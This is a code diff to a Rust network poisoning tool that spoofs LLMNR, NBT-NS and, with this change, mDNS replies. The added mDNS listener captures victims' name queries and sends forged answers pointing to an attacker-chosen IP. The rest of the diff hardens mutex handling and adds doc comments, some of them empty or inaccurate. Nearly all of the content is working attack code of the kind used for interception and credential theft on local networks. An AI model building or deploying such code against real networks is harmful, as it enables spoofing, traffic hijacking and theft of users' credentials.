@@ -44,11 +44,17 @@ pub const MDNS_PORT: u16 = 5353;
 /// LLMNR packet header
 #[derive(Debug, Clone)]
 pub struct LlmnrHeader {
+    /// Stable unique identifier.
     pub transaction_id: u16,
+    /// flags field
     pub flags: u16,
+    /// questions field
     pub questions: u16,
+    /// answers field
     pub answers: u16,
+    /// authority field
     pub authority: u16,
+    /// additional field
     pub additional: u16,
 }
 
@@ -101,8 +107,11 @@ impl LlmnrHeader {
 /// NBT-NS packet types
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum NbnsNodeType {
+    /// `` variant
     Workstation = 0x00,
+    /// `` variant
     NameServer = 0x02,
+    /// `` variant
     DomainController = 0x1C,
 }
 
@@ -206,11 +215,17 @@ impl Default for PoisonerConfig {
 /// Captured query information
 #[derive(Debug, Clone)]
 pub struct CapturedQuery {
+    /// Network protocol variant
     pub protocol: String,
+    /// source ip field
     pub source_ip: String,
+    /// Port number
     pub source_port: u16,
+    /// Object or account name.
     pub query_name: String,
+    /// Classification for this object.
     pub query_type: String,
+    /// timestamp field
     pub timestamp: u64,
 }
 
@@ -305,6 +320,30 @@ impl Poisoner {
             self.threads.push(handle);
         }
 
+        // Start mDNS listener
+        if self.config.mdns {
+            let running = Arc::clone(&self.running);
+            let listen_ip = self.config.listen_ip.clone();
+            let poison_ip = self.config.poison_ip.clone();
+            let analyze_only = self.config.analyze_only;
+            let target_hosts = self.config.target_hosts.clone();
+            let captured = Arc::clone(&self.captured_queries);
+
+            let handle = thread::spawn(move || {
+                if let Err(e) = Self::run_mdns_listener(
+                    running,
+                    &listen_ip,
+                    &poison_ip,
+                    analyze_only,
+                    &target_hosts,
+                    captured,
+                ) {
+                    error!("mDNS listener error: {}", e);
+                }
+            });
+            self.threads.push(handle);
+        }
+
         info!("Poisoner started successfully");
         Ok(())
     }
@@ -339,7 +378,13 @@ impl Poisoner {
 
     /// Get captured queries
     pub fn get_captured_queries(&self) -> Vec<CapturedQuery> {
-        self.captured_queries.lock().unwrap().clone()
+        self.captured_queries
+            .lock()
+            .unwrap_or_else(|e| {
+                warn!("Mutex poisoned in Poisoner — recovering data");
+                e.into_inner()
+            })
+            .clone()
     }
 
     // ═══════════════════════════════════════════════════════
@@ -382,7 +427,10 @@ impl Poisoner {
 
                         // Record captured query
                         {
-                            let mut cap = captured.lock().unwrap();
+                            let mut cap = captured.lock().unwrap_or_else(|e| {
+                                warn!("Mutex poisoned in Poisoner — recovering data");
+                                e.into_inner()
+                            });
                             cap.push(CapturedQuery {
                                 protocol: "LLMNR".to_string(),
                                 source_ip: src.ip().to_string(),
@@ -391,7 +439,7 @@ impl Poisoner {
                                 query_type: "A".to_string(),
                                 timestamp: std::time::SystemTime::now()
                                     .duration_since(std::time::UNIX_EPOCH)
-                                    .unwrap()
+                                    .unwrap_or_default()
                                     .as_secs(),
                             });
                         }
@@ -551,7 +599,10 @@ impl Poisoner {
 
                         // Record captured query
                         {
-                            let mut cap = captured.lock().unwrap();
+                            let mut cap = captured.lock().unwrap_or_else(|e| {
+                                warn!("Mutex poisoned in Poisoner — recovering data");
+                                e.into_inner()
+                            });
                             cap.push(CapturedQuery {
                                 protocol: "NBT-NS".to_string(),
                                 source_ip: src.ip().to_string(),
@@ -560,7 +611,7 @@ impl Poisoner {
                                 query_type: "NB".to_string(),
                                 timestamp: std::time::SystemTime::now()
                                     .duration_since(std::time::UNIX_EPOCH)
-                                    .unwrap()
+                                    .unwrap_or_default()
                                     .as_secs(),
                             });
                         }
@@ -595,6 +646,98 @@ impl Poisoner {
         }
 
         info!("NBT-NS listener stopped");
+        Ok(())
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // mDNS Listener
+    // ═══════════════════════════════════════════════════════
+
+    fn run_mdns_listener(
+        running: Arc<AtomicBool>,
+        listen_ip: &str,
+        poison_ip: &str,
+        analyze_only: bool,
+        target_hosts: &[String],
+        captured: Arc<std::sync::Mutex<Vec<CapturedQuery>>>,
+    ) -> Result<()> {
+        // Bind to mDNS port
+        let socket = UdpSocket::bind(format!("{}:{}", listen_ip, MDNS_PORT))
+            .map_err(|e| RelayError::Socket(format!("Failed to bind mDNS socket: {}", e)))?;
+
+        // Join multicast group
+        let multicast: Ipv4Addr = MDNS_MULTICAST;
+        let local: Ipv4Addr = listen_ip.parse().unwrap_or(Ipv4Addr::UNSPECIFIED);
+
+        socket
+            .join_multicast_v4(&multicast, &local)
+            .map_err(|e| RelayError::Socket(format!("Failed to join mDNS multicast: {}", e)))?;
+
+        socket
+            .set_read_timeout(Some(Duration::from_millis(100)))
+            .ok();
+
+        info!("mDNS listener started on {}:{}", listen_ip, MDNS_PORT);
+
+        let mut buf = [0u8; 65535];
+
+        while running.load(Ordering::SeqCst) {
+            match socket.recv_from(&mut buf) {
+                Ok((len, src)) => {
+                    // mDNS uses the same DNS wire format as LLMNR
+                    if let Some(query_name) = Self::parse_llmnr_query(&buf[..len]) {
+                        debug!("mDNS query for '{}' from {}", query_name, src);
+
+                        // Record captured query
+                        {
+                            let mut cap = captured.lock().unwrap_or_else(|e| {
+                                warn!("Mutex poisoned in Poisoner — recovering data");
+                                e.into_inner()
+                            });
+                            cap.push(CapturedQuery {
+                                protocol: "mDNS".to_string(),
+                                source_ip: src.ip().to_string(),
+                                source_port: src.port(),
+                                query_name: query_name.clone(),
+                                query_type: "A".to_string(),
+                                timestamp: std::time::SystemTime::now()
+                                    .duration_since(std::time::UNIX_EPOCH)
+                                    .unwrap_or_default()
+                                    .as_secs(),
+                            });
+                        }
+
+                        // Check if we should poison this query
+                        let should_poison = target_hosts.is_empty()
+                            || target_hosts
+                                .iter()
+                                .any(|t| query_name.to_lowercase().contains(&t.to_lowercase()));
+
+                        if should_poison && !analyze_only {
+                            // Build response — reuse LLMNR responder (same DNS wire format)
+                            if let Ok(response) = Self::build_llmnr_response(&buf[..len], poison_ip)
+                            {
+                                // mDNS responses are sent via unicast to the source port
+                                if let Err(e) = socket.send_to(&response, src) {
+                                    warn!("Failed to send mDNS response: {}", e);
+                                } else {
+                                    info!(
+                                        "Poisoned mDNS response for '{}' -> {}",
+                                        query_name, poison_ip
+                                    );
+                                }
+                            }
+                        }
+                    }
+                }
+                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
+                Err(e) => {
+                    warn!("mDNS recv error: {}", e);
+                }
+            }
+        }
+
+        info!("mDNS listener stopped");
         Ok(())
     }
 
